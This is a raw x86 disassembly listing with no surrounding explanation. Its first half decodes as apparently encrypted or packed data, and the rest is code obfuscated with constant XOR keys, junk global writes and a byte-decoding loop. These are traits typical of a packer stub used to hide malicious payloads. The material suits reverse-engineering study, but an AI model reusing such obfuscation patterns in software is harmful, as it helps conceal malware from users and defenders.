  407fb4:	ins    BYTE PTR es:[edi],dx
  407fb5:	and    al,0x3
  407fb7:	add    BYTE PTR [esi],al
  407fb9:	test   eax,0x7392e3a5
  407fbe:	xchg   BYTE PTR [edx+eiz*1],dh
  407fc1:	cld    
  407fc2:	call   0x6abbf976
  407fc7:	(bad)  
  407fc8:	adc    ah,BYTE PTR [edi-0x6e18e80f]
  407fce:	mov    ebp,0x9349f881
  407fd3:	inc    esp
  407fd4:	lahf   
  407fd5:	mov    ebx,0x4675a45b
  407fda:	aad    0xc7
  407fdc:	mov    ah,0x78
  407fde:	fnstenv [edx+0x576f72e7]
  407fe4:	and    al,0x57
  407fe6:	jmp    0x1110deec
  407feb:	sub    eax,0x849e4b8a
  407ff0:	xor    ebx,DWORD PTR [esi+0x1860b8d5]
  407ff6:	adc    eax,0xa478d8b7
  407ffb:	mov    bh,0x7
  407ffd:	and    BYTE PTR [ebp+0x18],bh
  408000:	jo     0x407fe3
  408002:	or     bl,BYTE PTR [ebx+0x5a0ab630]
  408008:	(bad)  
  408009:	mov    esi,0xd8bcc13e
  40800e:	xchg   BYTE PTR [ebx-0x34],ah
  408011:	je     0x407f9a
  408013:	iret   
  408014:	mov    dl,0xc9
  408016:	xlat   BYTE PTR ds:[ebx]
  408017:	push   edi
  408018:	mov    al,ds:0xa4c3398e
  40801d:	fcomip st,st(3)
  40801f:	fsub   DWORD PTR [edi+0x2d]
  408022:	and    BYTE PTR [ebx],dl
  408024:	push   cs
  408025:	loop   0x407fdc
  408027:	mov    dh,0xba
  408029:	cmp    DWORD PTR [ecx+0x7a],edi
  40802c:	or     al,0x72
  40802e:	or     dh,BYTE PTR [edx]
  408030:	clc    
  408031:	pop    eax
  408032:	jns    0x407fdd
  408034:	(bad)  
  408035:	test   eax,0xd0894b11
  40803a:	jmp    0xa80072bc
  40803f:	mov    dl,0xf4
  408041:	sbb    eax,ecx
  408043:	inc    eax
  408044:	test   eax,0x9fa328ef
  408049:	push   ds
  40804a:	ss mov eax,0x4071af17
  408050:	cmp    BYTE PTR [ecx-0x3a011897],bl
  408056:	fstp   TBYTE PTR [edi+0x4b3bbc63]
  40805c:	mov    ebp,0x25c66c38
  408061:	fstp   DWORD PTR [edi]
  408063:	aad    0xe3
  408065:	xor    BYTE PTR [esi-0x23193af],0xa5
  40806c:	ret    0x3784
  40806f:	jno    0x40801e
  408071:	add    ah,dl
  408073:	cmp    BYTE PTR ds:0x6abc40b3,ah
  408079:	mov    dl,dl
  40807b:	ins    DWORD PTR es:[edi],dx
  40807c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40807d:	nop
  40807e:	adc    DWORD PTR [eax+0x66e385d0],esp
  408084:	loop   0x40802f
  408086:	push   eax
  408087:	cmp    eax,0x7923be3d
  40808c:	repz in eax,dx
  40808e:	xchg   ebx,eax
  40808f:	pop    esp
  408090:	inc    ebx
  408091:	sbb    BYTE PTR [esi],cl
  408093:	mov    esi,0x3de4bd21
  408098:	cmp    al,0xce
  40809a:	das    
  40809b:	jae    0x40809e
  40809d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40809e:	dec    ebx
  40809f:	addr16 xor eax,0x39dcbc07
  4080a5:	jno    0x4080e7
  4080a7:	jmp    0xac9:0x304508d9
  4080ae:	inc    ebp
  4080af:	es aas 
  4080b1:	and    al,0xc4
  4080b3:	mov    ah,0x5e
  4080b5:	outs   dx,DWORD PTR ds:[esi]
  4080b6:	test   BYTE PTR ds:0x11495384,cl
  4080bc:	ret    
  4080bd:	inc    eax
  4080be:	nop
  4080bf:	pop    esp
  4080c0:	(bad)  
  4080c1:	xchg   esi,eax
  4080c2:	adc    ch,BYTE PTR [ecx+0x2ab99110]
  4080c8:	bound  edi,QWORD PTR [eax+edi*1]
  4080cb:	push   edx
  4080cc:	lds    eax,FWORD PTR [edx-0x2dd25895]
  4080d2:	lods   eax,DWORD PTR ds:[esi]
  4080d3:	mov    esp,0x1887bd57
  4080d8:	add    ah,bh
  4080da:	push   esp
  4080db:	xchg   BYTE PTR [esi+0x62ba1aa3],bh
  4080e1:	or     eax,0x203a8f8c
  4080e6:	push   es
  4080e7:	jno    0x408150
  4080e9:	adc    DWORD PTR [eax-0x7b],edi
  4080ec:	mov    es,WORD PTR [ebp+ebp*2-0x4c]
  4080f0:	xor    dh,BYTE PTR [edi-0x2d]
  4080f3:	inc    edi
  4080f4:	adc    eax,0xd358596c
  4080f9:	sub    BYTE PTR [ebx],cl
  4080fb:	mov    edx,0x1cfbdad7
  408100:	cli    
  408101:	adc    eax,0xab5572f7
  408106:	popa   
  408107:	sbb    al,0xa0
  408109:	pop    ss
  40810a:	dec    ebp
  40810b:	in     al,dx
  40810c:	or     ecx,DWORD PTR [ecx+0x10]
  40810f:	test   DWORD PTR [eax+0x504a749a],0xe4c20033
  408119:	push   eax
  40811a:	sub    al,0xc5
  40811c:	std    
  40811d:	xchg   edi,eax
  40811e:	loope  0x408178
  408120:	ins    BYTE PTR es:[edi],dx
  408121:	dec    ecx
  408122:	xlat   BYTE PTR ds:[ebx]
  408123:	fdivr  QWORD PTR [ebx+edi*4-0x4328e059]
  40812a:	mov    edx,0x649d19db
  40812f:	push   eax
  408130:	jne    0x40817c
  408132:	fsub   DWORD PTR [edi]
  408134:	ins    DWORD PTR es:[edi],dx
  408135:	lahf   
  408136:	lock gs inc ecx
  408139:	push   esp
  40813a:	mov    esp,0x67659c51
  40813f:	out    0xdc,al
  408141:	dec    ebx
  408142:	cmp    al,0x2f
  408144:	retf   0x88b9
  408147:	mov    es,WORD PTR [esp+0x78634194]
  40814e:	retf   0x3b77
  408151:	cmp    eax,0xea9de551
  408156:	mov    ebx,0xca76aff2
  40815b:	pop    ecx
  40815c:	pop    ecx
  40815d:	sbb    eax,0x751ca7a2
  408162:	aam    0x90
  408164:	sub    al,0x37
  408166:	call   0xeddd:0x6a832670
  40816d:	ds out dx,eax
  40816f:	in     al,dx
  408170:	int3   
  408171:	mov    esi,esp
  408173:	daa    
  408174:	icebp  
  408175:	jns    0x40818f
  408177:	and    al,0x99
  408179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40817a:	scas   al,BYTE PTR es:[edi]
  40817b:	loopne 0x4081f0
  40817d:	(bad)
  408180:	sbb    BYTE PTR [bp+si],al
  408183:	adc    BYTE PTR [ebx],dh
  408185:	jmp    0x2064:0x58c9d619
  40818c:	jp     0x408202
  40818e:	cmc    
  40818f:	dec    ecx
  408190:	cmp    BYTE PTR [eax],cl
  408192:	mov    eax,0xb55839a1
  408197:	mov    WORD PTR [esi],ss
  408199:	and    ah,BYTE PTR [edx-0x24]
  40819c:	fdivr  QWORD PTR [ecx]
  40819e:	(bad)  
  4081a1:	and    ecx,DWORD PTR [ecx]
  4081a3:	(bad)  
  4081a4:	or     eax,0x7dcf3133
  4081a9:	aaa    
  4081aa:	je     0x40820f
  4081ac:	or     al,0xf9
  4081ae:	cmp    bh,BYTE PTR [eax+0x40]
  4081b1:	adc    BYTE PTR ds:0x763f50ef,0x84
  4081b8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4081ba:	hlt    
  4081bb:	pop    eax
  4081bc:	ss mov esi,0xad19f626
  4081c2:	into   
  4081c3:	xchg   esp,eax
  4081c4:	das    
  4081c5:	mov    bl,0xeb
  4081c7:	js     0x408199
  4081c9:	dec    esi
  4081ca:	sbb    BYTE PTR [ebx-0x14],0x5f
  4081ce:	or     BYTE PTR [esi],ch
  4081d0:	test   ebx,edx
  4081d2:	xchg   ecx,eax
  4081d3:	and    ebp,ebp
  4081d5:	sub    al,BYTE PTR [esi]
  4081d7:	xchg   ebp,eax
  4081d8:	pop    ebp
  4081d9:	mov    esi,0x6eef7389
  4081de:	xchg   ebp,eax
  4081df:	sbb    DWORD PTR [ebx-0x55f19f2a],esi
  4081e5:	cmp    BYTE PTR [edx],dl
  4081e7:	jg     0x4081bf
  4081e9:	lock aad 0x51
  4081ec:	lahf   
  4081ed:	xchg   DWORD PTR ds:0xc0e18b6f,ecx
  4081f3:	pop    ebp
  4081f4:	(bad)  
  4081f5:	adc    edi,edi
  4081f7:	lods   eax,DWORD PTR ds:[esi]
  4081f8:	and    DWORD PTR [esi-0x22798e2d],ebp
  4081fe:	xor    DWORD PTR [ebx+ebp*4],esp
  408201:	stos   BYTE PTR es:[edi],al
  408202:	pop    edx
  408203:	mov    ah,0xe2
  408205:	dec    esp
  408206:	xchg   esi,eax
  408207:	jo     0x4081b7
  408209:	xchg   ecx,eax
  40820a:	int3   
  40820b:	je     0x40823b
  40820d:	or     esp,ecx
  40820f:	jecxz  0x408210
  408211:	cmp    ebp,DWORD PTR fs:[ebx]
  408214:	adc    dl,al
  408216:	push   eax
  408217:	dec    ecx
  408218:	adc    ebp,DWORD PTR [eax+0x67]
  40821b:	push   esp
  40821c:	gs push edi
  40821e:	jne    0x408225
  408220:	jae    0x408232
  408222:	jb     0x408280
  408224:	pop    edi
  408225:	cdq    
  408226:	cmp    al,0xe0
  408228:	push   esi
  408229:	pop    ss
  40822a:	cmp    eax,0xad9a0ddf
  40822f:	mov    eax,ds:0x6fe39b21
  408234:	inc    edx
  408235:	jg     0x408250
  408237:	lock dec ecx
  408239:	rcr    edx,cl
  40823b:	sub    eax,0xb5af9e3
  408240:	or     ebx,DWORD PTR [eax+0x77f2fdee]
  408246:	dec    esi
  408247:	test   edi,ecx
  408249:	arpl   cx,bp
  40824b:	mov    edi,0x835f0b4d
  408250:	stos   DWORD PTR es:[edi],eax
  408251:	push   eax
  408252:	in     al,0xc
  408254:	loop   0x40824b
  408256:	lods   eax,DWORD PTR ds:[esi]
  408257:	les    ebp,FWORD PTR fs:[edx-0x3d80292c]
  40825e:	call   0xa36b1422
  408263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408264:	shl    DWORD PTR [esi+eiz*2-0x78],1
  408268:	pop    ss
  408269:	pop    esi
  40826a:	jmp    0x408226
  40826c:	rcl    BYTE PTR [edx],0x1c
  40826f:	pop    ss
  408270:	lea    ebx,[ebx]
  408272:	xor    esi,DWORD PTR [edi]
  408274:	stos   BYTE PTR es:[edi],al
  408275:	dec    edx
  408276:	out    0x9b,eax
  408278:	push   eax
  408279:	(bad)  
  40827a:	push   edi
  40827b:	std    
  40827c:	add    DWORD PTR [edi+0x7c0be594],ecx
  408282:	sub    dl,BYTE PTR [ebx]
  408284:	dec    ebp
  408285:	sub    BYTE PTR [edx-0x3f],0x39
  408289:	int    0xe
  40828b:	rol    DWORD PTR [ebx+edi*4+0x4d],cl
  40828f:	inc    ecx
  408290:	into   
  408291:	leave  
  408292:	in     al,0xe8
  408294:	xchg   bx,ax
  408296:	(bad)  
  408298:	pop    es
  408299:	pop    edi
  40829a:	jbe    0x40828d
  40829c:	sbb    dl,BYTE PTR [esi+0x68]
  40829f:	out    dx,eax
  4082a0:	dec    edx
  4082a1:	cmp    BYTE PTR [eax+0x75077c5],0x5a
  4082a8:	push   ds
  4082a9:	or     eax,0x478c3231
  4082ae:	cld    
  4082af:	(bad)  
  4082b0:	and    DWORD PTR [ecx],ebp
  4082b2:	push   edx
  4082b3:	jnp    0x4082cc
  4082b5:	add    ebx,ebp
  4082b7:	nop
  4082b8:	push   ds
  4082b9:	bnd jmp ecx
  4082bc:	cmp    BYTE PTR [edx+ebp*4+0x6031dd92],bh
  4082c3:	ret    0xbb03
  4082c6:	xchg   esi,eax
  4082c7:	jp     0x408307
  4082c9:	cwde   
  4082ca:	std    
  4082cb:	scas   al,BYTE PTR es:[edi]
  4082cc:	iret   
  4082cd:	mov    bh,0x5b
  4082cf:	arpl   WORD PTR [ebx],ax
  4082d1:	fs push cs
  4082d3:	xlat   BYTE PTR ds:[ebx]
  4082d4:	cld    
  4082d5:	xor    al,0x8f
  4082d7:	shl    BYTE PTR [edi+eiz*8],cl
  4082da:	mov    ds:0x11de4749,al
  4082df:	scas   al,BYTE PTR es:[edi]
  4082e0:	cmp    al,0x50
  4082e2:	jg     0x408318
  4082e4:	cli    
  4082e5:	(bad)  
  4082e6:	bound  ecx,QWORD PTR [edx-0x30]
  4082e9:	add    al,0xa0
  4082eb:	inc    edi
  4082ec:	adc    BYTE PTR [eax+0x1e47316f],ch
  4082f2:	sti    
  4082f3:	mov    BYTE PTR [bx+di-0x2],bh
  4082f7:	int    0xb
  4082f9:	xchg   edi,eax
  4082fa:	xor    esi,DWORD PTR [edi]
  4082fc:	jns    0x408303
  4082fe:	fist   WORD PTR [ecx-0x47]
  408301:	dec    esp
  408302:	call   0xcf7a:0x6714878
  408309:	push   cs
  40830a:	sbb    cl,BYTE PTR [ebx]
  40830c:	or     DWORD PTR [ecx+0x9],0xc30a71c6
  408313:	push   es
  408314:	ss imul edx,esi,0xffffffa6
  408318:	jg     0x408317
  40831a:	ds test esi,ebp
  40831d:	inc    eax
  40831e:	test   DWORD PTR [eax+0x37],eax
  408321:	lock aad 0x9e
  408324:	fist   WORD PTR [esi-0x63]
  408327:	stos   DWORD PTR es:[edi],eax
  408328:	add    dh,BYTE PTR [esi]
  40832a:	xlat   BYTE PTR ds:[ebx]
  40832b:	inc    edi
  40832c:	jge    0x40839e
  40832e:	mov    gs,WORD PTR [ecx+0x1e61c063]
  408334:	ss jge 0x40834e
  408337:	xor    dh,ch
  408339:	jno    0x40834e
  40833b:	push   cs
  40833c:	loope  0x40836f
  40833e:	pusha  
  40833f:	dec    ebp
  408340:	cmpps  xmm6,XMMWORD PTR [esi+0x2d],0x2e
  408345:	sbb    DWORD PTR [edi+0x22],0xffffffb2
  408349:	or     al,0xa6
  40834b:	das    
  40834c:	mov    dh,0x98
  40834e:	inc    edi
  40834f:	inc    eax
  408350:	je     0x4082d2
  408352:	jmp    0xd6ee:0xb6bff81c
  408359:	sub    al,bh
  40835b:	into   
  40835c:	div    BYTE PTR [eax+ecx*4+0x35c46e5f]
  408363:	ins    DWORD PTR es:[edi],dx
  408364:	pop    esi
  408365:	out    dx,eax
  408366:	mov    esp,DWORD PTR [edx+edi*4]
  408369:	sbb    esp,ebx
  40836b:	add    bh,BYTE PTR [ebx+edi*4]
  40836e:	idiv   eax
  408370:	fdivr  DWORD PTR [ebx+0xf73e4]
  408376:	icebp  
  408377:	xchg   BYTE PTR [eax-0x360f2a66],bl
  40837d:	mov    ebx,0xfaf59f9c
  408382:	hlt    
  408383:	mov    BYTE PTR [ebx+0x4],dl
  408386:	ins    DWORD PTR es:[edi],dx
  408387:	popa   
  408388:	mov    BYTE PTR [ebp-0x23],ah
  40838b:	loop   0x40834f
  40838d:	or     ch,dl
  40838f:	clc    
  408390:	xor    al,0x7e
  408392:	push   ss
  408393:	inc    esi
  408394:	cmp    eax,0xb60fd68f
  408399:	adc    BYTE PTR [ecx-0x76],0xb7
  40839d:	nop
  40839e:	mov    ah,0x2e
  4083a0:	mov    al,ds:0x809cb475
  4083a5:	gs ret 
  4083a7:	jo     0x4083f6
  4083a9:	push   eax
  4083aa:	gs xchg ebx,eax
  4083ac:	adc    ecx,esi
  4083ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083af:	outs   dx,BYTE PTR ds:[esi]
  4083b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083b1:	mov    edx,0x8077a719
  4083b6:	adc    DWORD PTR [edi+0x12],edi
  4083b9:	mov    al,ds:0x684a6cfa
  4083be:	jae    0x40843c
  4083c0:	mov    DWORD PTR [eax],eax
  4083c2:	ds test bh,al
  4083c5:	mov    bl,ch
  4083c7:	push   ds
  4083c8:	stc    
  4083c9:	sti    
  4083ca:	pop    edi
  4083cb:	sub    DWORD PTR [ebx-0x2f0fc74b],edi
  4083d1:	jne    0x408443
  4083d3:	mov    ds:0x82e8bdfb,al
  4083d8:	push   eax
  4083d9:	push   ss
  4083da:	xchg   DWORD PTR [edi+0x1998d41],esi
  4083e0:	sub    al,0x4c
  4083e2:	push   esi
  4083e3:	cli    
  4083e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083e5:	(bad)  [ecx+0x29]
  4083e8:	daa    
  4083e9:	mov    cl,0x62
  4083eb:	xor    DWORD PTR [ebp+0x7bb7aff],esp
  4083f1:	add    BYTE PTR [ecx+0x6dbfeee6],bh
  4083f7:	dec    edi
  4083f8:	je     0x4083b2
  4083fa:	pop    ds
  4083fb:	inc    esp
  4083fc:	lahf   
  4083fd:	jnp    0x408383
  4083ff:	jno    0x40844e
  408401:	add    eax,DWORD PTR [edx-0x2085cb77]
  408407:	imul   ebx,ebp,0x621c376a
  40840d:	dec    edi
  40840e:	and    BYTE PTR [edi-0x1e],cl
  408411:	or     BYTE PTR [ebx+0x1f907296],ah
  408417:	mov    ebx,0x3ed1ffd4
  40841c:	push   ds
  40841d:	hlt    
  40841e:	inc    esp
  40841f:	mov    eax,ds:0xfab9c29
  408424:	popf   
  408425:	ins    BYTE PTR es:[edi],dx
  408426:	je     0x408445
  408428:	arpl   WORD PTR [edi],dx
  40842a:	pop    ecx
  40842b:	pop    esp
  40842c:	je     0x408425
  40842e:	in     al,0xd9
  408430:	retf   0x63b4
  408433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408434:	mov    es,WORD PTR [eax]
  408436:	(bad)  
  408438:	rcl    bh,0xf2
  40843b:	sbb    al,0xbb
  40843d:	mov    ebx,DWORD PTR [ebp+0x37]
  408440:	and    al,0x46
  408442:	ins    DWORD PTR es:[edi],dx
  408443:	(bad)  
  408444:	popa   
  408445:	push   ecx
  408446:	in     al,dx
  408447:	mov    eax,ds:0x6a30d71e
  40844c:	mov    cl,0xbc
  40844e:	in     eax,dx
  40844f:	scas   eax,DWORD PTR es:[edi]
  408450:	idiv   ebx
  408452:	int3   
  408453:	dec    ecx
  408454:	mov    ch,0xb1
  408456:	jo     0x4084a1
  408458:	push   ebp
  408459:	sbb    eax,0x10516d5f
  40845e:	outs   dx,DWORD PTR ds:[esi]
  40845f:	lods   al,BYTE PTR ds:[esi]
  408460:	adc    DWORD PTR [ebx],0xd3366ce3
  408466:	or     BYTE PTR [ebx+0x10048aee],0x88
  40846d:	inc    ebp
  40846e:	dec    DWORD PTR [ebx+0x558bd045]
  408474:	hlt    
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
